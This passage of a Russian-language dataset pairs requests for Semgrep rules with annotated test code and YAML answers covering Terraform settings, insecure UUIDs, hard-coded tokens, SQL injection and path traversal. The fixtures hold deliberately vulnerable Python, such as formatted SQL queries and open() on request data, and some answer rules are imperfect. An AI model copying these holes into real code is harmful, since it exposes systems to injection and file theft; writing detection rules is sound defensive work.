    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-appservice-auth.tf\n# fail\n# ruleid: azure-appservice-auth\nresource \"azurerm_app_service\" \"example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}\n\n# pass\nresource \"azurerm_app_service\" \"example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  auth_settings {\n    enabled                       = true\n    issuer                        = \"https://sts.windows.net/d13958f6-b541-4dad-97b9-5a39c6b01297\"\n    default_provider              = \"AzureActiveDirectory\"\n    unauthenticated_client_action = \"RedirectToLoginPage\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_servic\n• resource \"azurerm_app_service\" \"example\" {\n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service\n• resource \"azurerm_app_service\" \"example\" {\n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service\n\nБезопасные паттерны:  \n• resource \"azurerm_app_service\" \"example\" {\n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service\n• resource \"azurerm_app_service\" \"example\" {\n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service\n• resource \"azurerm_app_service\" \"example\" {\n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service\n\nЛегенда аннотаций:\n- // ruleid:azure-appservice-auth: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-appservice-auth: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-appservice-auth\n  message: >-\n    Ensure App Service Authentication is set on Azure App Service\n  patterns:\n  - pattern: resource\n  - pattern-not-inside: |\n      resource \"azurerm_app_service\" \"...\" {\n      ...\n      auth_settings {\n        ...\n        enabled = true\n        ...\n      }\n      ...\n      }\n  - pattern-inside: |\n      resource \"azurerm_app_service\" \"...\" {\n      ...\n      }\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure App Service в конфигурациях Terraform (HCL). Правило проверяет наличие блока auth_settings внутри ресурса azurerm_app_service. Если блок auth_settings отсутствует или не содержит enabled = true, то это считается опасным примером, так как аутентификация приложения может быть недостаточно настроена. Безопасным примером является наличие auth_settings с включенной аутентификацией.\n\n# Ключевые элементы:\n- ID: azure-appservice-auth\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-appservice-auth",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения insecure-uuid-version\nОписание уязвимости: Using UUID version 1 for UUID generation can lead to predictable UUIDs based on system information (e.g., MAC address, timestamp). This may lead to security risks such as the sandwich attack. Consider using `uuid.uuid4()` instead for better randomness and security.\nCWE: CWE-330: Use of Insufficiently Random Values\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-330: Use of Insufficiently Random Values\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-uuid-version.py\nimport uuid\ndef example_1():\n    # ruleid:insecure-uuid-version\n    uuid = uuid.uuid1()\n\nfrom uuid import uuid1\ndef example_2():\n    # ruleid:insecure-uuid-version\n    uuid = uuid1()\n\nfrom uuid import *\ndef example_3():\n    # ruleid:insecure-uuid-version\n    uuid = uuid1() \n\nimport uuid\ndef unrelated_function():\n    # ok:insecure-uuid-version\n    uuid = uuid4()  # Ограничиваем длину\n\nОпасные паттерны:\n• uuid = uuid.uuid1();\n• uuid1 = uuid1();\n• uuid = *; uuid1();\n\nБезопасные паттерны:  \n• uuid = uuid.uuid4();\n• uuid4 = uuid4();\n• uuid = *; uuid4();\n\nЛегенда аннотаций:\n- // ruleid:insecure-uuid-version: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-uuid-version: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: insecure-uuid-version\n    patterns:\n      - pattern: uuid.uuid1(...)\n    message: >-\n      Using UUID version 1 for UUID generation can lead to predictable UUIDs based on system information (e.g., MAC address, timestamp). This may lead to security risks such as the sandwich attack. Consider using `uuid.uuid4()` instead for better randomness and security.\n    metadata:\n      references:\n        - https://www.landh.tech/blog/20230811-sandwich-attack/\n      cwe: \n      - 'CWE-330: Use of Insufficiently Random Values'\n      owasp: \n      - A02:2021 - Cryptographic Failures\n      asvs:\n        section: V6 Stored Cryptography Verification Requirements\n        control_id: 6.3.2 Insecure UUID Generation\n        control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x14-V6-Cryptography.md#v63-random-values\n        version: '4'\n      category: security\n      technology:\n      - python\n      subcategory:\n      - audit\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: MEDIUM\n    languages:\n      - python\n    severity: WARNING\n    fix-regex:\n      regex: uuid1\n      replacement: uuid4\n    \n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции uuid.uuid1(), которая генерирует UUID версии 1. Эта версия использует системную информацию, такую как MAC-адрес и время, что делает UUID предсказуемыми и подверженными атакам, например, атаке \"сэндвич\". Правило ищет вызов функции uuid.uuid1(...) и выдает предупреждение о необходимости использовать более случайную функцию uuid.uuid4().\n\n# Ключевые элементы:\n- ID: insecure-uuid-version\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-uuid-version",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: gcp-gke-binary-authorization\nОписание уязвимости: Ensure use of Binary Authorization\t\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-gke-binary-authorization.tf\n# fail\n# ruleid: gcp-gke-binary-authorization\nresource \"google_container_cluster\" \"fail1\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n  project            = data.google_project.project.name\n\n  network    = var.network\n  subnetwork = var.subnetwork\n\n  ip_allocation_policy {\n    cluster_ipv4_cidr_block       = var.ip_allocation_policy[\"cluster_ipv4_cidr_block\"]\n    cluster_secondary_range_name  = var.ip_allocation_policy[\"cluster_secondary_range_name\"]\n    services_ipv4_cidr_block      = var.ip_allocation_policy[\"services_ipv4_cidr_block\"]\n    services_secondary_range_name = var.ip_allocation_policy[\"services_secondary_range_name\"]\n  }\n\n  remove_default_node_pool    = var.remove_default_node_pool\n  enable_binary_authorization = false\n\n  node_config {\n    workload_metadata_config {\n      node_metadata = \"GKE_METADATA_SERVER\"\n    }\n  }\n\n  release_channel {\n    channel = var.release_channel\n  }\n\n  master_auth {\n\n    client_certificate_config {\n      issue_client_certificate = false\n    }\n  }\n\n  addons_config {\n    http_load_balancing {\n      disabled = var.http_load_balancing_disabled\n    }\n\n    network_policy_config {\n      disabled = var.network_policy_config_disabled\n    }\n  }\n\n  maintenance_policy {\n    daily_maintenance_window {\n      start_time = var.maintenance_window\n    }\n  }\n\n  private_cluster_config {\n    enable_private_nodes    = var.private_cluster_config[\"enable_private_nodes\"]\n    enable_private_endpoint = var.private_cluster_config[\"enable_private_endpoint\"]\n    master_ipv4_cidr_block  = var.private_cluster_config[\"master_ipv4_cidr_block\"]\n  }\n\n  master_authorized_networks_config {\n    cidr_blocks {\n      cidr_block = var.master_authorized_network_cidr\n    }\n  }\n\n  network_policy {\n    enabled = true\n  }\n\n  pod_security_policy_config {\n    enabled = var.pod_security_policy_config_enabled\n  }\n\n  resource_labels = var.resource_labels\n}\n\n# fail\n# ruleid: gcp-gke-binar  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_container_cluster\" \"fail1\" { ... enable_binary_authorization = false ... }\n• resource \"google_container_cluster\" \"fail2\" { ... enable_binary_authorization = false ... }\n\nБезопасные паттерны:  \n• resource \"google_container_cluster\" \"success\" { ... enable_binary_authorization = true ... }\n\nЛегенда аннотаций:\n- // ruleid:gcp-gke-binary-authorization: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-gke-binary-authorization: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-gke-binary-authorization\n  patterns:\n    - pattern: resource\n    - pattern-inside: |\n        resource \"google_container_cluster\" \"...\" {\n        ...\n        }\n    - pattern-not-inside: |\n        resource \"google_container_cluster\" \"...\" {\n        ...\n        enable_binary_authorization = true\n        ...\n        }\n  message: >-\n    Ensure use of Binary Authorization\t\n  metadata:\n    category: best-practice\n    technology:\n      - terraform\n      - gcp\n  languages: [hcl]\n  severity: WARNING\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Google Kubernetes Engine (GKE) контейнерных кластеров, которые не используют Binary Authorization. Анализ выполняется путем поиска ресурсов типа 'google_container_cluster' в HCL-коде. Правило проверяет наличие параметра 'enable_binary_authorization', который должен быть установлен в значение 'true'. Если этот параметр отсутствует или имеет другое значение, правило отмечает код как потенциально небезопасный.\n\n# Ключевые элементы:\n- ID: gcp-gke-binary-authorization\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-gke-binary-authorization",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: azure-automation-encrypted\nОписание уязвимости: Ensure that Automation account variables are encrypted\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-automation-encrypted.tf\n# fail\n# ruleid: azure-automation-encrypted\nresource \"azurerm_automation_variable_string\" \"example\" {\n    name                    = \"tfex-example-var\"\n    resource_group_name     = azurerm_resource_group.example.name\n    automation_account_name = azurerm_automation_account.example.name\n    value                   = \"Hello, Terraform Basic Test.\"\n    encrypted               = false\n}\n\n# fail\n# ruleid: azure-automation-encrypted\nresource \"azurerm_automation_variable_datetime\" \"example\" {\n    name                    = \"tfex-example-var\"\n    resource_group_name     = azurerm_resource_group.example.name\n    automation_account_name = azurerm_automation_account.example.name\n    value                   = \"Hello, Terraform Basic Test.\"\n}\n\n# pass\nresource \"azurerm_automation_variable_int\" \"example\" {\n    name                    = \"tfex-example-var\"\n    resource_group_name     = azurerm_resource_group.example.name\n    automation_account_name = azurerm_automation_account.example.name\n    value                   = \"Hello, Terraform Basic Test.\"\n    encrypted               = true\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_automation_variable_string\" \"example\" { ... encrypted = false }\n• resource \"azurerm_automation_variable_datetime\" \"example\" { ... }\n• resource \"azurerm_automation_variable_int\" \"example\" { ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_automation_variable_string\" \"example\" { ... encrypted = true }\n• resource \"azurerm_automation_variable_datetime\" \"example\" { ... encrypted = true }\n• resource \"azurerm_automation_variable_int\" \"example\" { ... encrypted = true }\n\nЛегенда аннотаций:\n- // ruleid:azure-automation-encrypted: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-automation-encrypted: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-automation-encrypted\n  patterns:\n  - pattern-either:\n    - pattern-inside: |\n        resource \"azurerm_automation_variable_string\" \"...\" {\n        ...\n        }\n    - pattern-inside: |\n        resource \"azurerm_automation_variable_datetime\" \"...\" {\n        ...\n        }\n    - pattern-inside: |\n        resource \"azurerm_automation_variable_int\" \"...\" {\n        ...\n        }\n  - pattern-not-inside: |\n      resource \"azurerm_automation_variable_string\" \"...\" {\n      ...\n      encrypted = true\n      ...\n      }\n  - pattern-not-inside: |\n      resource \"azurerm_automation_variable_datetime\" \"...\" {\n      ...\n      encrypted = true\n      ...\n      }\n  - pattern-not-inside: |\n      resource \"azurerm_automation_variable_int\" \"...\" {\n      ...\n      encrypted = true\n      ...\n      }\n  message: Ensure that Automation account variables are encrypted\n  languages: [hcl]\n  severity: WARNING\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    category: security\n    technology:\n    - terraform\n    - azure\n\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure Automation Variable в конфигурационном файле Terraform с расширением .tf. Правило проверяет наличие атрибутов 'encrypted' у типов ресурсов 'azurerm_automation_variable_string', 'azurerm_automation_variable_datetime' и 'azurerm_automation_variable_int'. Если атрибут 'encrypted' не установлен в значение 'true', то это считается опасным примером, так как переменные автоматизации могут быть не зашифрованы. Безопасным примером является случай, когда атрибут 'encrypted' явно установлен в 'true'.\n\n# Ключевые элементы:\n- ID: azure-automation-encrypted\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-automation-encrypted",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: mattermost-access-token\nОписание уязвимости: A gitleaks mattermost-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: mattermost-access-token.go\n// ruleid: mattermost-access-token\nmattermost_api_token = \"aeelfcgjm4xmn77xu82ftzudy5\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: mattermost-access-token.go\n// ruleid: mattermost-access-token\nmattermost_api_token = \"aeelfcgjm4xmn77xu82ftzudy5\"\n• // File: another-mattermost-go-file.go\n// ruleid: mattermost-access-token\nvar mattermostToken string = \"bcd123efghijklmmnopqrstuvwxy123\"\n\nБезопасные паттерны:  \n• // File: safe-go-file.go\n// idempotent: safe\nconst mattermostApiKey = os.Getenv(\"MATTERMOST_API_KEY\")\n• // File: secure-go-file.go\n// idempotent: safe\nvar mattermostToken string = getSecureTokenFromVault()\n\nЛегенда аннотаций:\n- // ruleid:mattermost-access-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:mattermost-access-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: mattermost-access-token\n  message: A gitleaks mattermost-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:mattermost)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-z0-9]{26})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена доступа Mattermost в исходном коде. Регулярное выражение ищет строку, содержащую слово 'mattermost' или его вариации, за которым следует символ присваивания или сравнения, а затем последовательность из 26 буквенно-цифровых символов, которые являются типичным форматом токенов Mattermost.\n\n# Ключевые элементы:\n- ID: mattermost-access-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "mattermost-access-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: formatted-sql-query\nОписание уязвимости: Detected possible formatted SQL query. Use parameterized queries instead.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: formatted-sql-query.py\n# cf. https://github.com/we45/Vulnerable-Flask-App/blob/752ee16087c0bfb79073f68802d907569a1f0df7/app/app.py\n\nfrom flask import session, Flask, jsonify, request, Response, render_template, render_template_string, url_for\nfrom flask_sqlalchemy import SQLAlchemy\nimport jwt\nfrom jwt.exceptions import DecodeError, MissingRequiredClaimError, InvalidKeyError\nimport json\nimport random\n\napp_port = os.environ.get('APP_PORT', 5050)\napp = Flask(__name__, template_folder='templates')\ndb = SQLAlchemy(app)\n\n@app.route('/search', methods = ['POST'])\ndef search_customer():\n    token = request.headers.get('Authorization')\n    if not token:\n        return jsonify({'Error': 'Not Authenticated!'}),403\n    else:\n        if not verify_jwt(token):\n            return jsonify({'Error': 'Invalid Token'}),403\n        else:\n            content = request.json\n            results = []\n            if content:\n                try:\n                    # ok:formatted-sql-query\n                    dummy = db.engine.execute(\"SELECT * FROM customer\")\n\n                    search_term = content['search']\n                    # ruleid:formatted-sql-query\n                    inline = db.engine.execute(\"SELECT * FROM cutsomer WHERE username = '%s'\" % search_term)\n                    print(search_term)\n                    str_query = \"SELECT first_name, last_name, username FROM customer WHERE username = '%s';\".format(search_term)\n                    # mycust = Customer.query.filter_by(username = search_term).first()\n                    # return jsonify({'Customer': mycust.username, 'First Name': mycust.first_name}),200\n\n                    # ruleid:formatted-sql-query\n                    search_query = db.engine.execute(str_query)\n                    for result in search_query:\n                        results.append(list(result))\n                    print(results)\n                    return jsonify(results),200\n                except Exception as e:\n                    template   # Ограничиваем длину\n\nОпасные паттерны:\n• db.engine.execute(\"SELECT * FROM cutsomer WHERE username = '%s'\" % search_term)\n• str_query = \"SELECT first_name, last_name, username FROM customer WHERE username = '%s';\".format(search_term)\n• sql = f'SELECT * FROM customer WHERE username = {search_term}'\n\nБезопасные паттерны:  \n• dummy = db.engine.execute(\"SELECT * FROM customer\")\n• mycust = Customer.query.filter_by(username = search_term).first()\n• db.engine.execute(\"SELECT * FROM customer\", {'username': search_term})\n\nЛегенда аннотаций:\n- // ruleid:formatted-sql-query: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:formatted-sql-query: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: formatted-sql-query\n  message: >-\n    Detected possible formatted SQL query. Use parameterized queries instead.\n  metadata:\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    references:\n    - https://stackoverflow.com/questions/775296/mysql-parameterized-queries\n    category: security\n    technology:\n    - python\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  severity: WARNING\n  languages:\n  - python\n  pattern-either:\n  - pattern: $DB.execute(\"...\" % ...)\n  - pattern: $DB.execute(\"...\".format(...))\n  - pattern: $DB.execute(f\"...\")\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          $SQL = \"...\" % ...\n          ...\n      - pattern-inside: |\n          $SQL = \"...\".format(...)\n          ...\n      - pattern-inside: |\n          $SQL = f\"...{$X}...\"\n          ...\n    - pattern: $DB.execute($SQL)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможных уязвимостей SQL-инъекции, вызванных использованием форматированных строк при выполнении запросов SQL. Анализируются различные способы формирования SQL-запросов, включая использование оператора '%' для форматирования строк, метод .format() и f-string. Опасным является любой случай, когда пользовательский ввод напрямую включается в SQL-запрос без предварительной проверки или параметризованного запроса.\n\n# Ключевые элементы:\n- ID: formatted-sql-query\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "formatted-sql-query",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: azure-appservice-identityprovider-enabled\nОписание уязвимости: Ensure that Managed identity provider is enabled for app services\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-appservice-identityprovider-enabled.tf\n# fail\n# ruleid: azure-appservice-identityprovider-enabled\nresource \"azurerm_app_service\" \"example\" {\n    name                = \"example-app-service\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    app_service_plan_id = azurerm_app_service_plan.example.id\n\n    site_config {\n        dotnet_framework_version = \"v4.0\"\n        scm_type                 = \"LocalGit\"\n    }\n\n    app_settings = {\n        \"SOME_KEY\" = \"some-value\"\n    }\n\n    connection_string {\n        name  = \"Database\"\n        type  = \"SQLServer\"\n        value = \"Server=some-server.mydomain.com;Integrated Security=SSPI\"\n    }\n}\n\n# pass\nresource \"azurerm_app_service\" \"example\" {\n    name                = \"example-app-service\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    app_service_plan_id = azurerm_app_service_plan.example.id\n    https_only          = true\n    site_config {\n        dotnet_framework_version = \"v5.0\"\n        scm_type                 = \"someValue\"\n    }\n    identity {\n        type = \"SystemAssigned\"\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_app_service\" \"example\" { ... } // fail\n• resource \"azurerm_app_service\" \"example\" { ... site_config { ... } } // fail\n\nБезопасные паттерны:  \n• resource \"azurerm_app_service\" \"example\" { ... identity { type = \"SystemAssigned\" } ... } // pass\n• resource \"azurerm_app_service\" \"example\" { ... identity { type = \"None\" } ... } // pass\n\nЛегенда аннотаций:\n- // ruleid:azure-appservice-identityprovider-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-appservice-identityprovider-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-appservice-identityprovider-enabled\n  message: >-\n    Ensure that Managed identity provider is enabled for app services\n  patterns:\n  - pattern: resource\n  - pattern-not-inside: |\n      resource \"azurerm_app_service\" \"...\" {\n      ...\n      identity {\n      ...\n      type = \"SystemAssigned\"\n      ...\n      }\n      ...\n      }\n  - pattern-inside: |\n      resource \"azurerm_app_service\" \"...\" {\n      ...\n      }\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure App Service, которые не используют управляемую идентификационную провайдерную службу (managed identity provider). Анализ выполняется путем поиска шаблона ресурса Azure App Service и исключения случаев, когда внутри этого шаблона явно указан тип идентификации 'SystemAssigned'. Если ресурс найден, но идентификатор не установлен, это считается опасным примером, так как доступ может быть недостаточно контролируемым.\n\n# Ключевые элементы:\n- ID: azure-appservice-identityprovider-enabled\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-appservice-identityprovider-enabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: path-traversal-open\nОписание уязвимости: Found request data in a call to 'open'. Ensure the request data is validated or sanitized, otherwise it could result in path traversal attacks and therefore sensitive data being leaked. To mitigate, consider using os.path.abspath or os.path.realpath or the pathlib library.\nCWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: path-traversal-open.py\nimport re, os\nfrom django.http import HttpResponse\nfrom somewhere import APIView\n\ndef unsafe(request):\n    # ruleid: path-traversal-open\n    filename = request.POST.get('filename')\n    contents = request.POST.get('contents')\n    print(\"something\")\n    f = open(filename, 'r')\n    f.write(contents)\n    f.close()\n\ndef unsafe_inline(request):\n    # ruleid: path-traversal-open\n    f = open(request.GET.get('filename'))\n    f.write(request.POST.get('contents'))\n    f.close()\n\ndef unsafe_dict(request):\n    # ruleid: path-traversal-open\n    f = open(request.POST['filename'])\n    f.write(\"hello\")\n    f.close()\n\ndef unsafe_with(request):\n    # ruleid: path-traversal-open\n    filename = request.POST.get(\"filename\")\n    with open(filename, 'r') as fin:\n        data = fin.read()\n    return HttpResponse(data)\n\ndef safe(request):\n    # ok: path-traversal-open\n    filename = \"/tmp/data.txt\"\n    f = open(filename)\n    f.write(\"hello\")\n    f.close()\n\n# Real-world finding\ndef download_doc(request):\n    # ruleid: path-traversal-open\n    url = request.GET.get(\"url\")\n    format_doc = url.split(\".\")\n    if format_doc[-1] == \"docx\":\n        file_name = str(int(time.time())) + \".docx\"\n    else:\n        file_name = str(int(time.time())) + \".xlsx\"\n\n    def file_iterator(_file, chunk_size=512):\n        while True:\n            c = _file.read(chunk_size)\n            if c:\n                yield c\n            else:\n                break\n\n    _file = open(url, \"rb\")\n    response = StreamingHttpResponse(file_iterator(_file))\n    response[\"Content-Type\"] = \"application/octet-stream\"\n    response[\"Content-Disposition\"] = \"attachment;filename=\\\"{0}\\\"\".format(file_name)\n    return response\n\nclass GenerateUserAPI(APIView):\n    def get(self, request):\n        \"\"\"\n        download users excel\n        \"\"\"\n        # ruleid: path-traversal-open\n        file_id = request.GET.get(\"file_id\")\n        if not file_id:\n            return self.error(\"Invalid Parameter, file_id is requir  # Ограничиваем длину\n\nОпасные паттерны:\n• filename = request.POST.get('filename')\n...\no = open(filename, 'r')\n• f = open(request.GET.get('filename'))\n• f = open(request.POST['filename'])\n\nБезопасные паттерны:  \n• filename = \"/tmp/data.txt\"\no = open(filename)\n• filename = \"data.txt\"\no = open(filename)\n• filename = '/tmp/data.txt'\no = open(filename)\n\nЛегенда аннотаций:\n- // ruleid:path-traversal-open: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:path-traversal-open: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: path-traversal-open\n  message: >-\n    Found request data in a call to 'open'. Ensure the request data is validated or sanitized, otherwise\n    it could result in path traversal attacks and therefore sensitive data being leaked.\n    To mitigate, consider using os.path.abspath or os.path.realpath\n    or the pathlib library.\n  metadata:\n    cwe:\n    - \"CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    references:\n    - https://owasp.org/www-community/attacks/Path_Traversal\n    category: security\n    technology:\n    - django\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      def $FUNC(...):\n        ...\n  - pattern-either:\n    - pattern: open(..., request.$W.get(...), ...)\n    - pattern: open(..., $S.format(..., request.$W.get(...), ...), ...)\n    